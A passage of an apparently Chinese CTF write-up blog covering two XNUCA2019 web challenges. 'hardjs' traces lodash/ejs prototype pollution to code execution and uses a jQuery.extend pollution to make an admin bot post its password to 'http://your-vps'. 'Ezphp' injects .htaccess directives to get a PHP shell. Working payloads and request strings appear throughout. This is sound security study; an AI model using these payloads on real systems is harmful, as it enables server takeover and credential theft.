class="line"><span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    ret.push(doms);</span><br><span class="line">    res.json(ret);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json([&#123;&#125;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这段代码的意思，出题人也提示了我们，首先把数据查出来，然后通过循环遍历，将raws中的dom通过lodash.defaultDeep赋给doms，这里的JSON.parse应该是起了很大的助攻的，简单看一个例子</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxW1C8.png" alt="nxW1C8.png"></p>
<p>本来我们给doms应该是下面这样的数组，但是通过上面这样我们可以传过去类似一个多维数组这样去导致原型链污染，后面大概就是一些基操了，先删除对应id的，然后再插入信息，少于5条的判断也就不再赘述了。但是这里是只有原型链污染的，在server.js中是没有可触发的点的，<strong>我们还需要找到一个未被定义的，但是被调用了的一个变量</strong>，所以这里可能在ejs中产生污染，毕竟是用它去渲染的，然后可以跟进一处渲染点，如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">    res.render(<span class="string">'login_register'</span>,&#123;</span><br><span class="line"></span><br><span class="line">        title:<span class="string">" storeHtml | logins "</span>,</span><br><span class="line"></span><br><span class="line">        buttonHintF:<span class="string">"登 录"</span>,</span><br><span class="line"></span><br><span class="line">        buttonHintS:<span class="string">"没有账号?"</span>,</span><br><span class="line"></span><br><span class="line">        hint:<span class="string">"登录"</span>,</span><br><span class="line"></span><br><span class="line">        next:<span class="string">"/register"</span></span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>跟进分析一下</p>
<p>首先进入responce.js中的render方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  .....</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进入app.render   </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="keyword">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="keyword">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line"></span><br><span class="line">  .....</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>跟进tryRender</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进view.render</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  debug(<span class="string">'render "%s"'</span>, <span class="keyword">this</span>.path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.engine(<span class="keyword">this</span>.path, options, callback);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进入engine方法，这里才到了调用ejs</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exports.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  .......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>跟进tryHandleCache</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> cb(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">cb(<span class="literal">null</span>, result);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进handleCache</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line">  ....</span><br><span class="line">  func = exports.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    exports.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进exports.compile</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exports.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br></pre></td></tr></table></figure>

<p>这里new了一个Template对象，跟进去看一下</p>
<p>这个function Template里面的变量很满足原型链污染触发的亚子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">opts = opts || &#123;&#125;;</span><br><span class="line"> <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line"> <span class="keyword">this</span>.templateText = text;</span><br><span class="line"> <span class="keyword">this</span>.mode = <span class="literal">null</span>;</span><br><span class="line"> <span class="keyword">this</span>.truncate = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">this</span>.currentLine = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">this</span>.source = <span class="string">''</span>;</span><br><span class="line"> <span class="keyword">this</span>.dependencies = [];</span><br><span class="line"> options.client = opts.client || <span class="literal">false</span>;</span><br><span class="line"> options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br><span class="line"> options.compileDebug = opts.compileDebug !== <span class="literal">false</span>;</span><br><span class="line"> options.debug = !!opts.debug;</span><br><span class="line"> options.filename = opts.filename;</span><br><span class="line"> options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;</span><br><span class="line"> options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;</span><br><span class="line"> options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;</span><br><span class="line"> options.strict = opts.strict || <span class="literal">false</span>;</span><br><span class="line"> options.context = opts.context;</span><br><span class="line"> options.cache = opts.cache || <span class="literal">false</span>;</span><br><span class="line"> options.rmWhitespace = opts.rmWhitespace;</span><br><span class="line"> options.root = opts.root;</span><br><span class="line"> options.outputFunctionName = opts.outputFunctionName;</span><br><span class="line"> options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;</span><br><span class="line"> options.views = opts.views;</span><br><span class="line"> options.async = opts.async;</span><br></pre></td></tr></table></figure>

<p>一路向下跟进</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxHzRI.png" alt="nxHzRI.png"></p>
<p>我们可以清楚的看到outputFunctionName是未定义的，那么通过原型链污染污染这个这个变量，即可rce。</p>
<p>下面的payload打五次，访问/get即可得到flag</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"type"</span>:<span class="string">"wiki"</span>,<span class="string">"content"</span>:&#123;<span class="string">"constructor"</span>: &#123;<span class="string">"prototype"</span>: &#123;<span class="string">"outputFunctionName"</span>: <span class="string">"a=1; return process.env.FLAG"</span>; <span class="keyword">var</span> tmp &#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;: &quot;a&#x3D;1; return process.env.FLAG&#x2F;&#x2F;&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="前后端组合利用"><a href="#前后端组合利用" class="headerlink" title="前后端组合利用"></a>前后端组合利用</h4><p>这个组合利用太强了,膜wonderkun师傅</p>
<p>首先看一下robot.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">driverpath = <span class="string">'/usr/bin/chromedriver'</span></span><br><span class="line">host= <span class="string">"http://127.0.0.1/"</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">"admin"</span></span><br><span class="line">password = <span class="string">'flag&#123;lihuaiqiu_is_so_Cool&#125;'</span></span><br><span class="line"></span><br><span class="line">client = webdriver.Chrome(chrome_options=chrome_options,executable_path=driverpath)</span><br><span class="line">client.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">client.set_script_timeout(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] start chrome browser ......"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">client.get(host)</span><br><span class="line">client.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">client.set_script_timeout(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    client.switch_to_alert().accept()</span><br><span class="line"><span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">usernameForm = client.find_element_by_xpath(<span class="string">"//input[@name='username']"</span>)</span><br><span class="line">passwordForm = client.find_element_by_xpath(<span class="string">"//input[@name='password']"</span>)</span><br><span class="line"></span><br><span class="line">usernameForm.clear()</span><br><span class="line">passwordForm.clear()</span><br><span class="line">usernameForm.send_keys(username)</span><br><span class="line">passwordForm.send_keys(password)</span><br><span class="line">loginButton = client.find_element_by_xpath(<span class="string">"//input[@type='submit']"</span>)</span><br><span class="line">loginButton.click()</span><br><span class="line">print(client.current_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># content = driver.page_source.encode('utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(content)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        client.quit()</span><br></pre></td></tr></table></figure>

<p>首先可以看出密码就是我们要的flag，这里我本地为了方便改了flag。可以看到这个脚本是直接访问的<a href="http://127.0.0.1。然后去通过Xpath来搜索input" target="_blank" rel="noopener">http://127.0.0.1。然后去通过Xpath来搜索input</a> name 和password，最后去提交flag在这个找到的表单里</p>
<p>那我们如果在我们的主页中提交一个表单，将flag发送到我们的vps这样可行吗？</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nzJBDJ.png" alt="nzJBDJ.png"></p>
<p>很明显是不行了，因为沙盒直接将脚本的执行阻断掉了，那么我们可以试着将这个表单放到沙盒外，这样就可以拿到flag了</p>
<p>关键在于app.js,在app.js中我们可以发现jQuery.extend CVE-2019-11358这个原型链污染漏洞，具体如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url:<span class="string">"/get"</span>,</span><br><span class="line">    type:<span class="string">"get"</span>,</span><br><span class="line">    <span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">console</span>.log(allNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过datas去污染allNode,那么接下来去看看这两个分别是什么吧</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nzNvrD.png" alt="nzNvrD.png"></p>
<p>大意就是把我添加的放到Allnode里去之后再去渲染，那么这个污染点就ok了，下面接着去找一下出触发点</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> hints = &#123;</span><br><span class="line">		header : <span class="string">"自定义内容"</span>,</span><br><span class="line">		notice: <span class="string">"自定义公告"</span>,</span><br><span class="line">		wiki : <span class="string">"自定义wiki"</span>,</span><br><span class="line">		button:<span class="string">"自定义内容"</span>,</span><br><span class="line">		message: <span class="string">"自定义留言内容"</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">		<span class="comment">// console.log(key);</span></span><br><span class="line">		element = $(<span class="string">"li[type='"</span>+key+<span class="string">"']"</span>); </span><br><span class="line">		<span class="keyword">if</span>(element)&#123;</span><br><span class="line">			element.find(<span class="string">"span.content"</span>).html(hints[key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>这个就是触发点了，首先遍历hints对象中的key，但是我们上面可是有原型链污染的，所以这里可以遍历到我们的原型链污染的值，所以触发点就在这里了，接着向下跟着，这里要找span标签并且class为content的那个地方并且渲染key对应的值，这里就正好符合我们所需要的要求了，由于这个app.js是结合index.ejs进行渲染的，所以我们需要在index.ejs中找到这个span并且这个span位于sandbox外</p>
<p>在sandbox中类似这种的li标签是都在沙盒內部的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$tmp = $(<span class="string">"li[type='header']"</span>);</span><br><span class="line">$newNode = $( $tmp.html() );</span><br><span class="line">$newNode.find(<span class="string">"span.content"</span>).html(dom[key][<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// console.log($newNode.html());</span></span><br><span class="line">viewport.appendChild( $newNode[<span class="number">0</span>] );</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>最终发现同时满足li和具有span-content的地方如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">"logger"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 col-sm-centered"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"am-pre-scrollable"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-success"</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-danger"</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以把这个span-content的值改为我们获取flag的表单</p>
<p>利用Payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;logger&quot;:&quot;&lt;form action&#x3D;&#39;http:&#x2F;&#x2F;your-vps&#39; method&#x3D;&#39;post&#39; class&#x3D;&#39;am-form&#39;&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; id&#x3D;&#39;email&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;password&#39; name&#x3D;&#39;password&#39; id&#x3D;&#39;password&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;&#39; &gt;&lt;&#x2F;form&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可在object中加上logger，还要处理一下登陆的问题，因为robot.py没有登陆的操作，下面payload打五次，绕过登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;login&quot;:true,&quot;userid&quot;:1&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>最后监听一下端口，拿到模拟flag</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nz0Hcq.png" alt="nz0Hcq.png"></p>
<p>最后的话看了一下这个extend</p>
<p>datas</p>
<p><img src="https://s2.ax1x.com/2019/09/21/uS9Hu4.png" alt="uS9Hu4.png"></p>
<p>allnode</p>
<p><img src="https://s2.ax1x.com/2019/09/21/uSEAaQ.png" alt="uSEAaQ.png"></p>
<p>可以看出这里通过添加进来的数组进行污染的，之前在extend的时候其实就把我们的__proto__做为了data中数组对象的原型链也就是操控了Object，那么添加到新的allnode中，依然保持这样，所以是这样直接造成了污染</p>
<p>在lodash中其实原理个人感觉也是和这个差不多的，多了一个json parse解析成数组的步骤，再直接加刀那个对象里去，依然是通过这个数组对象进行原型链污染</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
<p><a href="https://xz.aliyun.com/t/6101" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101</a></p>
<p><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA2019-Ezphp</title>
    <url>/2019/09/23/XNUCA2019-Ezphp/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本来投了先知..可惜没被收.</p>
<h3 id="官方上的题目的三种解法"><a href="#官方上的题目的三种解法" class="headerlink" title="官方上的题目的三种解法"></a>官方上的题目的三种解法</h3><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑：当每次打开index.php时，先删除当前目录下的所有文件，然后进行文件包含，和传参检验，对filename和content的内容进行检测，最后把传入的内容加上<code>&quot;\nJust one chance&quot;</code>，写入文件，.htaccess的文件内容要求还是比较严格的，如果最后一行写入了Just one chance，那么就会直接500了，所以说先要bypass掉这个字符串，才能接着往下做，这里的bypass手法是利用<code>\</code>这个字符去转义换行符，类似于shell的拼接方式，可实现字符串的连接，效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjnNiF.png" alt="mjnNiF.png"></p>
<p>成功实现字符连接，通过htaccess实现xss。</p>
<p>现在既然能成功规避掉这个这个字符串也就意味着可以成功控制htaccess的内容了，官方wp给出三种解来通过htaccess去getshell。</p>
<h4 id="第一种预期解"><a href="#第一种预期解" class="headerlink" title="第一种预期解"></a>第一种预期解</h4><p>这个解法就比较好的解释的了<code>include(&#39;fl3g.php&#39;)</code>这个地方，因为当时在getshell后其实也没有发现这个include的作用，赛后看到这个预期解才明白。</p>
<p>首先第一步设置如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting <span class="number">32767</span></span><br><span class="line">php_value include_path <span class="string">"%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>首先设置报错信息储存在/tmp/fl3g.php，设置报错级别为32767(报告所有的可能出现的错误)，设置报错路径为不存在的路径，实际是我们的经过utf7编码后的shell语句，用utf7编码的原因是写入error.log的内容会被html编码，这里采用utf7编码即可绕过。</p>
<p>第二步设置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">"/tmp"</span></span><br><span class="line">php_value zend.multibyte <span class="number">1</span>  <span class="comment">//检测文件是否具有Unicode内容</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>这里新生成的htaccess首先设置了文件包含路径为/tmp，这样我们包含fl3g.php，其实包含的就是/tmp/fl3g.php，并且通过下面两个设置成功进行内容解码，就把我们的shell语句成功包含到index.php了</p>
<p>最终两步payload如下</p>
<p>第一步</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php_value error_log /tmp/fl3g.php%<span class="number">0</span>aphp_value error_reporting <span class="number">32767</span>%<span class="number">0</span>aphp_value include_path <span class="string">"%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"</span>%<span class="number">0</span>a%<span class="number">23</span> \&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<p>第二步打两次拿可getshell(第一次生成新的配置文件，第二次在配置文件的作用下即可包含shell语句)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php_value include_path <span class="string">"/tmp"</span>%<span class="number">0</span>aphp_value zend.multibyte <span class="number">1</span>%<span class="number">0</span>aphp_value zend.script_encoding <span class="string">"UTF-7"</span>%<span class="number">0</span>a%<span class="number">23</span> \&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/30/mjJ27j.png" alt="mjJ27j.png"></p>
<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>这个是rois的解法，rois也发过Write up，我也就不再赘述了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">0</span></span><br><span class="line">php_value pcre.jit <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>原理是通过设置pcre的回溯次数上限为0，导致返回false绕过正则的限制，进而绕过文件名的限制，并php://filter和base64编码来绕过题中对content的参数的限制。</p>
<h4 id="第三种解法"><a href="#第三种解法" class="headerlink" title="第三种解法"></a>第三种解法</h4><p>通过在htaccess中写入shell语句，并且设置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\ <span class="comment">//通过 \ 来进行字符连接来规避content中的过滤</span></span><br><span class="line">le <span class="string">".htaccess"</span></span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;\</span></span><br></pre></td></tr></table></figure>

<p>通过auto_prepend_file的设置使得index.php对.htaccess的内容进行包含而getshell</p>
<p>最终payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php phpinfo(); ?&gt;\</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjU7GR.png" alt="mjU7GR.png"></p>
<h3 id="对题目的一些思考"><a href="#对题目的一些思考" class="headerlink" title="对题目的一些思考"></a>对题目的一些思考</h3><p>首先思考的一些问题是题目通过什么规则限制了通过file_put_contents新建出php文件的解析，和index.php为什么无法覆盖(这个还是比较好解释的，控制权限就行)，为什么通过<code>AddType application/x-httpd-php .txt</code>这种规则无法生效。</p>
<p>首先还是看了一下apache的配置文件apache2.conf，下面来说一下主要的几个地方</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjaxXV.png" alt="mjaxXV.png"></p>
<p>这是文件中设置的几个规则，在这里 /var/www的规则是不去寻找.htaccess文件，也就是.htaccess是不生效的，所以当时就很奇怪为什么index.php却是受到htaccess的影响的，接下向下翻，反向有两处包含配置文件的地方</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjdlhd.png" alt="mjdlhd.png"></p>
<p>那么就接着去这两个目录下翻一翻配置文件吧，最主要的两个文件其实是</p>
<p>conf-available下的docker-php.conf</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjdh4J.png" alt="mjdh4J.png"></p>
<p>这个规则的意思是设置了/var/www目录下的文件是受.htaccess文件的影响</p>
